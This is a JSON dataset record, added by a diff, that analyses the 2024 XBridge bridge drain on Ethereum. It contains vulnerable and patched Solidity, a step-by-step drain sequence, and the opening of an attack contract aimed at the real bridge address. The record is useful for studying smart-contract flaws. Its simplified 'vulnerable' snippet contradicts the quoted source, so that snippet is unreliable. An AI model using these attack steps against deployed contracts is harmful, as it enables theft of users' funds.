@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-04-XX_XBridge_ListTokenWithdrawUnauthorized",
+ "source_file": "2024/2024-04-XX_XBridge_ListTokenWithdrawUnauthorized.md",
+ "title": "XBridge — listToken + withdrawTokens Unauthorized Drain Analysis",
+ "date": "2024-04-01",
+ "protocol": "XBridge",
+ "chain": "Ethereum",
+ "loss_raw": "~$1,600,000",
+ "loss_usd": 1600000.0,
+ "root_cause": "`listToken()` allowed the same token address to be registered multiple times under different chain IDs (85936, 95838), enabling an attacker to drain all STC tokens held by the bridge via `withdrawTokens()`",
+ "attack_tx": null,
+ "vulnerable_contract": "XBridge 0x354cca2f",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: listToken duplicate registration + withdrawTokens insufficient validation\nstruct TokenInfo {\n    address tokenAddress;\n    uint256 chainId;\n    bool isMintable;\n}\n\nmapping(uint256 => TokenInfo) public listedTokens;\n\n// No duplicate registration check, no ownership validation\nfunction listToken(\n    TokenInfo memory baseToken,\n    TokenInfo memory correspondingToken,\n    bool _isMintable\n) external payable {\n    require(msg.value >= listingFee, \"insufficient fee\");\n    // Same token address can be re-registered under a different chain ID\n    listedTokens[baseToken.chainId] = baseToken;\n    listedTokens[correspondingToken.chainId] = correspondingToken;\n}\n\n// Anyone can withdraw if the token is registered\nfunction withdrawTokens(address token, address receiver, uint256 amount) external {\n    // No access control — executes for any registered token\n    IERC20(token).transfer(receiver, amount);\n}\n\n//",
+  "// File: XBridge.sol\n    function listToken(tokenInfo memory baseToken, tokenInfo memory correspondingToken, bool _isMintable) external payable {  // ❌ vulnerability\n        address _baseToken = baseToken.token;\n        address _correspondingToken = correspondingToken.token;\n        require(_baseToken != address(0), \"INVALID_ADDR\");\n        require(_correspondingToken != address(0), \"INVALID_ADDR\");\n        require(tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_baseToken] == address(0) && tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] == address(0), \"THIS_PAIR_ALREADY_LISTED\");\n\n        isMintableWithChainId[baseToken.chain][correspondingToken.chain][_baseToken][_correspondingToken] = _isMintable;\n        isMintableWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken][_baseToken] = _isMintable;\n        isMintableWithChainId[correspondingToken.chain][baseToken.chain][_baseToken][_correspondingToken] = _isMintable;\n        isMintableWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken][_baseToken] = _isMintable;\n\n        tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_baseToken] = _correspondingToken;\n        tokenToTokenWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] = _baseToken;\n        tokenToTokenWithChainId[correspondingToken.chain][baseToken.chain][_baseToken] = _correspondingToken;\n        tokenToTokenWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken] = _baseToken;\n\n\n        if(_isMintable) {\n            isWrappedWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken] = true;\n            isWrappedWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken] = true;\n            isWrapped[_correspondingToken] = true;\n\n        }\n\n        tokenOwnerWithChainId[baseToken.chain][correspondingToken.chain][_baseToken][_correspondingToken] = msg.sender;\n        tokenOwnerWithChainId[baseToken.chain][correspondingToken.chain][_correspondingToken][_baseToken] = msg.sender;\n        tokenOwnerWithChainId[correspondingToken.chain][baseToken.chain][_baseToken][_correspondingToken] = msg.sender;\n        tokenOwnerWithChainId[correspondingToken.chain][baseToken.chain][_correspondingToken][_baseToken] = msg.sender;\n\n        if(_baseToken == _correspondingToken) _tokenOwner[_baseToken] = msg.sender;\n        else {\n            if(_baseToken.code.length > 0) _tokenOwner[_baseToken] = msg.sender;\n            else _tokenOwner[_correspondingToken] = msg.sender;\n        }\n\n        if(!excludeFeeFromListing[msg.sender]) transferListingFee(listingFeeCollector, msg.sender, msg.value);\n\n        emit TokenListed(_baseToken, baseToken.chain, _correspondingToken, correspondingToken.chain, _isMintable, msg.sender);\n\n    }"
+ ],
+ "code_after": [
+  "✅ Safe code: token registration validation + withdrawTokens access control\nfunction listToken(...) external payable onlyOwner {\n    require(!isListed[baseToken.tokenAddress], \"already listed\");\n    // ...\n}\n\nfunction withdrawTokens(address token, address receiver, uint256 amount) external onlyBridge {\n    require(isPendingWithdrawal[token][receiver][amount], \"no pending withdrawal\");\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] XBridge.listToken(STC@chainId=85936, STC@chainId=95838, false)",
+  "→ [2] XBridge.withdrawTokens(STC, attacker, bridgeBalance)",
+  "No access control → full STC balance drained from bridge",
+  "→ [3] STC tokens and other assets stolen",
+  "→ [4] ~$1.6M (STC, SRLTY, Mazi, etc.) drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] XBridge.listToken(STC@chainId=85936, STC@chainId=95838, false)\n  │         └─ msg.value = 0.15 ETH (listing fee)\n  │         └─ Same token address registered under two different chain IDs\n  │\n  ├─→ [2] XBridge.withdrawTokens(STC, attacker, bridgeBalance)\n  │         └─ No access control → full STC balance drained from bridge\n  │\n  ├─→ [3] STC tokens and other assets stolen\n  │\n  └─→ [4] ~$1.6M (STC, SRLTY, Mazi, etc.) drained",
+  "interface IXBridge {\n    struct TokenInfo {\n        address tokenAddress;\n        uint256 chainId;\n        bool isMintable;\n    }\n\n    function listToken(\n        TokenInfo memory baseToken,\n        TokenInfo memory correspondingToken,\n        bool _isMintable\n    ) external payable;\n\n    function withdrawTokens(address token, address receiver, uint256 amount) external;\n}\n\ncontract AttackContract {\n    IXBridge constant bridge = IXBridge(0x354cca2f55dde182d36fe34d673430e226a3cb8c);\n    IERC20   constant STC    = IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);\n\n    function testExploit() external payable {\n        // [1] Register STC under fictitious chain IDs (0.15 ETH listing fee)\n        IXBridge.TokenInfo memory baseToken = IXBridge.TokenInfo({\n            tokenAddress: address(STC)"
+ ]
+}
